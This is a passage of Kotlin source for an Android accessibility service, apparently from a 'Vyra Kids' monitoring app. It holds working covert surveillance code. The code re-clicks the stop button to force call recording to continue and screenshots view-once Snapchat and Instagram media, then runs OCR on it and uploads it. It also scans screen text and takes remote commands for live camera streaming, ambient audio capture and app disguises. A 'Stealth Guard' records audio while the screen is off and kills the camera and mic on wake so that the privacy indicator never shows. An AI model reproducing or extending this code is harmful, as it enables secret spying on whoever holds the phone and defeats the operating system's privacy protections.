            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""

            // If user clicked the stop recording button
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                (text.contains("stop") || desc.contains("stop") || text.contains("pause"))) {

                Log.w(AppConstants.TAG, "Anti-Tamper Triggered: Child attempted to stop call recording!")

                // Re-tap/resume record automatically after 300ms
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    } catch (e: Exception) {
                        Log.e(AppConstants.TAG, "Failed to auto-resume recording", e)
                    }
                }, 300)

                // Dispatch urgent alert to Parent Dashboard
                val alertPayload = mapOf(
                    "type" to "TAMPER_ALERT",
                    "title" to "Call Recording Anti-Tamper",
                    "message" to "Child attempted to manually stop call recording during active call.",
                    "timestamp" to System.currentTimeMillis()
                )
                NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                break
            }
        }
    }

    /**
     * In-App Camera Trap & Outgoing 1-View Media Trap:
     * Detects when the child takes a photo or clicks SEND on a 1-view snap in Snapchat / Instagram.
     * Captures the outgoing media frame before it disappears from the screen!
     */
    private fun handleSocialAppActivity(packageName: String, event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED) return

        val text = event.text?.joinToString(" ")?.lowercase() ?: ""
        val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
        val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""

        val isShutterClick = viewId.contains("shutter") || viewId.contains("capture") ||
                viewId.contains("camera") || contentDesc.contains("take photo") ||
                contentDesc.contains("capture") || text.contains("capture")

        val isOutgoingSendClick = viewId.contains("send") || viewId.contains("action_send") ||
                contentDesc.contains("send") || text.contains("send") || viewId.contains("send_button") ||
                contentDesc.contains("view once") || text.contains("view once") || contentDesc.contains("1 view")

        val isIncomingViewOnceClick = contentDesc.contains("view once") || text.contains("view once") ||
                contentDesc.contains("1 photo") || text.contains("1 photo") ||
                viewId.contains("view_once") || contentDesc.contains("view photo") ||
                text.contains("view photo") || contentDesc.contains("photo, view once") ||
                (contentDesc.contains("opened") && contentDesc.contains("photo"))

        val now = System.currentTimeMillis()
        // Debounce snapshots to at most once every 1.5 seconds
        if ((isShutterClick || isOutgoingSendClick || isIncomingViewOnceClick) && (now - lastSnapshotTime > 1500)) {
            lastSnapshotTime = now
            if (isIncomingViewOnceClick) {
                Log.i(AppConstants.TAG, "Child opened Incoming 1-View Media in $packageName (viewId: $viewId). Scheduling delayed compositor capture.")
                executor.execute {
                    try { Thread.sleep(350) } catch (_: Exception) {}
                    captureScreenSnapshot(packageName, isOutgoing = false)
                }
            } else {
                val actionType = if (isOutgoingSendClick) "Outgoing 1-View Media Send" else "Camera Shutter"
                Log.i(AppConstants.TAG, "Child $actionType triggered in $packageName (viewId: $viewId)")
                captureScreenSnapshot(packageName, isOutgoing = isOutgoingSendClick)
            }
        }
    }

    /**
     * Takes an event-based screenshot preview for the parent using AccessibilityService.takeScreenshot.
     * Captures incoming snaps OR outgoing 1-view snaps sent by child.
     */
    private fun captureScreenSnapshot(sourceApp: String, isOutgoing: Boolean = false) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val hwBuffer = screenshotResult.hardwareBuffer
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                hwBuffer,
                                screenshotResult.colorSpace
                            ) ?: return

                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
                            } else {
                                bitmap
                            }

                            val prefix = if (isOutgoing) "sent_1view_" else "snap_"
                            val snapshotFile = File(filesDir, "${prefix}${System.currentTimeMillis()}.jpg")
                            FileOutputStream(snapshotFile).use { out ->
                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                            }

                            Log.i(AppConstants.TAG, "Saved 1-view media frame [Outgoing: $isOutgoing]: ${snapshotFile.name}")

                            val cleanApp = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram"
                            val resolvedContact = extractActiveChatContact(sourceApp, rootInActiveWindow).ifBlank {
                                com.vyra.kids.core.ActiveContactTracker.getLastContact(cleanApp) ?: ""
                            }
                            val snapSender = if (resolvedContact.isNotBlank()) {
                                if (isOutgoing) "Aryan (Child) [Sent to $resolvedContact]" else resolvedContact
                            } else {
                                if (isOutgoing) "Aryan (Child)" else "$cleanApp Contact"
                            }
                            val snapTitle = if (resolvedContact.isNotBlank()) {
                                if (isOutgoing) "📷 [Sent 1-View Snap to $resolvedContact]" else "📷 [Received 1-View Snap from $resolvedContact]"
                            } else {
                                if (isOutgoing) "📷 [Sent 1-View Media Captured]" else "📷 [Received 1-View Media Captured]"
                            }

                            runMlKitOcrAndSyncSnap(
                                sourceApp = cleanApp,
                                sender = snapSender,
                                titleText = snapTitle,
                                snapFile = snapshotFile,
                                bitmap = softwareBitmap,
                                isOutgoing = isOutgoing
                            )
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Error saving screenshot", e)
                        } finally {
                            try { hwBuffer.close() } catch (_: Exception) {}
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(AppConstants.TAG, "takeScreenshot failed with code $errorCode")
                    }
                }
            )
        }
    }

    /**
     * Scans screen text nodes for harmful/suspicious keywords.
     */
    private fun scanScreenText(packageName: String, node: AccessibilityNodeInfo?, depth: Int = 0) {
        if (node == null || depth > 25) return

        val text = node.text?.toString() ?: ""
        if (text.isNotBlank()) {
            val lowerText = text.lowercase()
            for (keyword in sensitiveKeywords) {
                if (lowerText.contains(keyword)) {
                    Log.w(AppConstants.TAG, "Sensitive Keyword Match [$keyword] in $packageName: $text")

                    val alertPayload = mapOf(
                        "type" to "KEYWORD_ALERT",
                        "app" to packageName,
                        "keyword" to keyword,
                        "contextText" to text.take(120),
                        "timestamp" to System.currentTimeMillis()
                    )
                    NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                    break
                }
            }
        }

        // Recursively inspect children
        for (i in 0 until node.childCount) {
            scanScreenText(packageName, node.getChild(i), depth + 1)
        }
    }

    private var screenStateReceiver: android.content.BroadcastReceiver? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(AppConstants.TAG, "VyraAccessibilityService connected")

        // 1. Sync device status and start listening to remote commands via Firebase
        val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
        firebaseSync.syncDeviceStatus(isOnline = true)

        // 2. Start Same-Wi-Fi Direct LAN Sync Server (Zero cloud quota)
        com.vyra.kids.core.LocalLanSyncServer.getInstance(this).start()

        // 3. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
        registerStealthScreenGuard()

        firebaseSync.startListeningToCommands { action, payload ->
            when (action) {
                "LOUDSPEAKER_INTERCOM" -> {
                    val announcement = payload["announcement"]?.toString() ?: "Attention: Please respond to parents immediately."
                    val intent = Intent(this, VoiceIntercomPlayerService::class.java).apply {
                        setAction(VoiceIntercomPlayerService.ACTION_SPEAK_TEXT)
                        putExtra(VoiceIntercomPlayerService.EXTRA_SPEECH_TEXT, announcement)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
                "LOCK_PHONE" -> {
                    val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.lockNow()
                }
                "SWITCH_DISGUISE" -> {
                    val profileName = payload["disguise"]?.toString() ?: "System Toolkit"
                    val profile = com.vyra.kids.core.DisguiseProfile.entries.find { it.title.equals(profileName, ignoreCase = true) }
                    if (profile != null) {
                        com.vyra.kids.core.DisguiseManager.applyDisguise(this, profile)
                    }
                }
                "SET_STEALTH_GUARD" -> {
                    val enabled = payload["enabled"] as? Boolean ?: true
                    com.vyra.kids.core.PrefsManager(this).isStealthScreenGuardEnabled = enabled
                    Log.i(AppConstants.TAG, "Stealth Screen Guard updated: $enabled")
                }
                "START_CAMERA_STREAM" -> {
                    val facing = payload["lens"]?.toString() ?: "back"
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_START_CAMERA)
                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
                "STOP_CAMERA_STREAM" -> {
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_STOP_CAMERA)
                    }
                    startService(intent)
                }
                "SWITCH_CAMERA_LENS" -> {
                    val facing = payload["lens"]?.toString() ?: "back"
                    val intent = Intent(this, RemoteCameraStreamService::class.java).apply {
                        setAction(RemoteCameraStreamService.ACTION_SWITCH_CAMERA)
                        putExtra(RemoteCameraStreamService.EXTRA_CAMERA_FACING, facing)
                    }
                    startService(intent)
                }
                "START_AMBIENT_RECORDING", "START_LIVE_AUDIO" -> {
                    val intent = Intent(this, AmbientAudioLoggerService::class.java).apply {
                        setAction(AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                    Log.i(AppConstants.TAG, "Triggered on-demand Ambient Audio Recording")
                }
                "STOP_AMBIENT_RECORDING", "STOP_LIVE_AUDIO" -> {
                    val intent = Intent(this, AmbientAudioLoggerService::class.java).apply {
                        setAction(AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING)
                    }
                    startService(intent)
                    Log.i(AppConstants.TAG, "Stopped on-demand Ambient Audio Recording")
                }
            }
        }
    }

    private fun registerStealthScreenGuard() {
        if (screenStateReceiver != null) return

        screenStateReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                val prefs = com.vyra.kids.core.PrefsManager(this@VyraAccessibilityService)
                when (intent?.action) {
                    Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                        // The child woke up the screen!
                        com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = true)
                        if (prefs.isStealthScreenGuardEnabled) {
                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
                            // Immediately cut off camera & ambient mic streams within 50ms
                            stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
                            
                            val stopAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
                            }
                            startService(stopAmbient)
                        }
                    }
                    Intent.ACTION_SCREEN_OFF -> {
                        com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService).syncDeviceStatus(isScreenOn = false)
                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Activating pocket ambient voice logger.")
                        if (prefs.isStealthScreenGuardEnabled) {
                            val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(startAmbient)
                            } else {
                                startService(startAmbient)
                            }
                        }
                    }
                }
            }
        }

        val filter = android.content.IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        registerReceiver(screenStateReceiver, filter)
    }

    private fun preprocessBitmapForOcr(src: Bitmap): Bitmap {
        return try {
            val bmp = Bitmap.createBitmap(src.width, src.height, Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(bmp)
            val paint = android.graphics.Paint()
            val matrix = android.graphics.ColorMatrix()
            matrix.setSaturation(0f)
            val contrast = 1.45f
            val brightness = -10f
            val contrastMatrix = android.graphics.ColorMatrix(floatArrayOf(
                contrast, 0f, 0f, 0f, brightness,
                0f, contrast, 0f, 0f, brightness,
                0f, 0f, contrast, 0f, brightness,
                0f, 0f, 0f, 1f, 0f
            ))
            matrix.postConcat(contrastMatrix)
            paint.colorFilter = android.graphics.ColorMatrixColorFilter(matrix)
            canvas.drawBitmap(src, 0f, 0f, paint)
            bmp
        } catch (_: Exception) {
            src
        }
    }

    private fun cropCenterCaptionBand(src: Bitmap): Bitmap {
        return try {
            val startY = (src.height * 0.25).toInt()
            val cropHeight = (src.height * 0.50).toInt()
            Bitmap.createBitmap(src, 0, startY, src.width, cropHeight)
        } catch (_: Exception) {
            src
        }
    }

    /**
     * God-Level Multi-Pass Google ML Kit Text Recognition:
     * Pass 1: Latin model on High-Contrast Preprocessed full image (English text/captions)
     * Pass 2: Latin model on Center Caption Band Crop (zoomed into Snapchat's classic banner strip)
     * Pass 3: Devanagari model on Preprocessed image (Hindi / Hinglish text)
     * Pass 4: Latin model on Raw RGB bitmap (colored text, neon stickers, gradient overlays)
     * Lines are cleaned, deduplicated across English & Hindi Unicode, and synced to Parent Dashboard.
     */
    private fun runMlKitOcrAndSyncSnap(
        sourceApp: String,
        sender: String,
        titleText: String,
        snapFile: File,
        bitmap: Bitmap,
        isOutgoing: Boolean
    ) {
        try {
            val latinRecognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val devanagariRecognizer = TextRecognition.getClient(DevanagariTextRecognizerOptions.Builder().build())

            val preprocessedFull = preprocessBitmapForOcr(bitmap)
            val centerCaptionCrop = cropCenterCaptionBand(preprocessedFull)

            val fullImageLatin = InputImage.fromBitmap(preprocessedFull, 0)
            val centerImageLatin = InputImage.fromBitmap(centerCaptionCrop, 0)
            val fullImageDevanagari = InputImage.fromBitmap(preprocessedFull, 0)
            val rawImage = InputImage.fromBitmap(bitmap, 0)

            val extractedLines = java.util.Collections.synchronizedList(mutableListOf<String>())
            val pendingPasses = java.util.concurrent.atomic.AtomicInteger(4)

            fun checkAndFinish() {
                if (pendingPasses.decrementAndGet() == 0) {
                    val cleanText = cleanAndDeduplicateOcrLines(extractedLines)
                    if (cleanText.isNotBlank()) {
                        Log.i(AppConstants.TAG, "⚡ God-Level ML Kit OCR Extracted (${sourceApp} -> ${sender}):\n$cleanText")
                    }
                    uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, cleanText.ifBlank { null })
                }
            }

            // Pass 1: Latin on High-Contrast Full
            latinRecognizer.process(fullImageLatin)
                .addOnSuccessListener { visionText ->
                    for (block in visionText.textBlocks) {
                        for (line in block.lines) {
                            extractedLines.add(line.text.trim())
                        }
                    }
                    checkAndFinish()
                }
                .addOnFailureListener { checkAndFinish() }

            // Pass 2: Latin on Center Caption Strip (Snapchat Caption Strip)
            latinRecognizer.process(centerImageLatin)
                .addOnSuccessListener { visionText ->
                    for (block in visionText.textBlocks) {
                        for (line in block.lines) {
                            extractedLines.add(line.text.trim())
                        }
                    }
                    checkAndFinish()
                }
                .addOnFailureListener { checkAndFinish() }

            // Pass 3: Devanagari on Full (Hindi / Hinglish)
            devanagariRecognizer.process(fullImageDevanagari)
                .addOnSuccessListener { visionText ->
                    for (block in visionText.textBlocks) {
                        for (line in block.lines) {
                            extractedLines.add(line.text.trim())
                        }
                    }
                    checkAndFinish()
                }
                .addOnFailureListener { checkAndFinish() }

            // Pass 4: Latin on Raw RGB (Colored/Neon Stickers)
            latinRecognizer.process(rawImage)
                .addOnSuccessListener { visionText ->
                    for (block in visionText.textBlocks) {
                        for (line in block.lines) {
                            extractedLines.add(line.text.trim())
                        }
                    }
                    checkAndFinish()
                }
                .addOnFailureListener { checkAndFinish() }

        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
            uploadSnapWithOcr(sourceApp, sender, titleText, snapFile, isOutgoing, null)
        }
    }

    private fun cleanAndDeduplicateOcrLines(lines: List<String>): String {
        val seen = mutableSetOf<String>()
        val result = mutableListOf<String>()
        for (line in lines) {
            val trimmed = line.trim()
            if (trimmed.length < 2) continue
            val lower = trimmed.lowercase()

            // Filter status bar battery/clock noise
            if (lower.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[ap]m)?$")) ||
                lower.matches(Regex("^[0-9]{1,3}%$")) ||
                lower in setOf("lte", "volte", "5g", "4g", "wifi", "tap to load", "tap to view", "new snap")
            ) continue

            // Retain English alphanumeric and Hindi Devanagari characters
            val normalized = lower.replace(Regex("[^a-z0-9\\u0900-\\u097F]"), "")
            if (normalized.length >= 2 && seen.add(normalized)) {
                result.add(trimmed)
            }
        }
        return result.joinToString("\n")
    }

    private fun uploadSnapWithOcr(
        sourceApp: String,
        sender: String,
        titleText: String,
        snapFile: File,
        isOutgoing: Boolean,
        ocrText: String?
    ) {
        val syncManager = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
        val cleanSender = normalizeContactName(sender)
        val isTarget = isWatchlistContact(cleanSender)
        val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
        syncManager.uploadMediaAndSyncChatMessage(
            msgId = msgId,
            app = sourceApp,
            sender = cleanSender,
            text = titleText,
            mediaFile = snapFile,
            mediaType = "snap",
            isViewOnce = true,
            isIncoming = !isOutgoing,
            isWatchlistTarget = isTarget,
            ocrText = ocrText
        )
    }

    override fun onDestroy() {
        stopSnapchatPoller()
        try {
            com.vyra.kids.core.LocalLanSyncServer.getInstance(this).stop()
        } catch (_: Exception) {}
        screenStateReceiver?.let {
            try { unregisterReceiver(it) } catch (_: Exception) {}
        }
        super.onDestroy()
    }

    override fun onInterrupt() {
        Log.w(AppConstants.TAG, "VyraAccessibilityService Interrupted")
    }
}
